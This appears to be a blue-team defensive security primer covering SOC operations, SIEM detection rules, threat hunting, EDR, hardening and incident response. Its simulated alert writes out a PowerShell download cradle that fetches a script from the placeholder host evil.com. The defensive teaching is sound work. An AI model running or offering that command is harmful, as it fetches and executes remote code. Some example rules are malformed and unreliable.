🛡️ Blue Team: Defender's Mindset

🎯 Mission

Monitor, detect, respond, and contain threats. Proactive security: hardening, vulnerability management, threat intelligence, detection engineering.

Key metrics: MTTD (mean time to detect), MTTR (mean time to respond).

🔄 Purple Team Integration

Collaboration with Red Team: emulate attacks, test detections, tune SIEM rules, improve visibility. Outcome: stronger defenses.

📡 Security Operations Center (SOC)

🔍 SOC Tiers & Functions

🔹 Tier 1: Alert triage, initial investigation
🔹 Tier 2: Incident validation, deeper analysis
🔹 Tier 3: Advanced hunting, malware analysis
🔹 Tier 4: Threat hunting, intelligence integration

Tools: SIEM (Splunk, Sentinel, QRadar), SOAR, EDR.

📊 SIEM & Log Management

Centralized log aggregation (Sysmon, Windows Event Logs, firewall, proxies). Detection rules (Sigma, KQL, SPL). Use cases: brute force, privilege escalation, lateral movement.

# Example Sigma rule for suspicious process creation (ransomware pattern)
title: Possible Ransomware Activity
status: experimental
logsource: product: windows, category: process_creation
detection: selection: Image|endswith: '\vssadmin.exe'
🔎 Threat Hunting & Detection Engineering

📌 Hypothesis-Driven Hunting

Based on MITRE ATT&CK tactics. Examples: hunting for pass-the-hash (event ID 4624 with logon type 9), unusual scheduled tasks, Kerberoasting (4688, 4769).

Tools: Kusto Query Language (Azure Data Explorer), Splunk ES, Elastic Stack, Velociraptor.

🧬 Detection as Code

Atomic Red Team, Sigma rules, and unit testing for detections. Use Sigma to create SIEM-agnostic rules, Atomic Red Team to validate.

# Simulated detection: abnormal outbound network connection
index=windows src_ip=internal* dest_port=445 | stats count by dest_ip | where count > 100
🖥️ Endpoint Detection & Response (EDR)

🔹 EDR Capabilities

Process tree, memory inspection, command line telemetry, remote shell, isolation, rollback. Vendors: CrowdStrike, Microsoft Defender for Endpoint, SentinelOne, Carbon Black.

✋ Hardening Guides

Attack surface reduction rules, AppLocker, WDAC, LAPS, credential guard, exploit protection. Disable LLMNR, SMB signing.

🛠️ Sysmon & Logging

Sysmon event ID 1 (process creation), 3 (network), 7 (image loaded). Forward via Winlogbeat or NXLog to SIEM.
# Install Sysmon with full config
Sysmon64.exe -accepteula -i sysmonconfig.xml
🚨 Incident Response Lifecycle (NIST SP 800-61)

1. Preparation & 2. Detection

IR plan, playbooks, tabletop exercises. Detect via SIEM, AV, EDR, user reports.

3. Analysis & 4. Containment

Forensic imaging, memory analysis (Volatility), timeline analysis. Short-term containment (block IP, isolate host) and long-term (patch, reset creds).

5. Eradication & 6. Recovery

Remove malware, close backdoors, restore clean backups. Recovery monitoring.

7. Post-Incident (Lessons Learned)

Retrospective, improve detection, update playbooks, share IOCs.

🕹️ Interactive Detection Lab (Example)

📋 Scenario: Suspicious PowerShell download cradle

Log source: Windows Event 4104 (PowerShell script block). Detection query (Splunk): index=main EventCode=4104 ScriptBlockText="*downloadstring*"

Response: Isolate host, capture memory, block remote IP, analyze executed script.

🔍 Simulated Alert

Alert: "PowerShell download cradle" on host WS-APP01
User: administrator
Process: powershell.exe -exec bypass -c (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Action: Terminate process + quarantine endpoint.
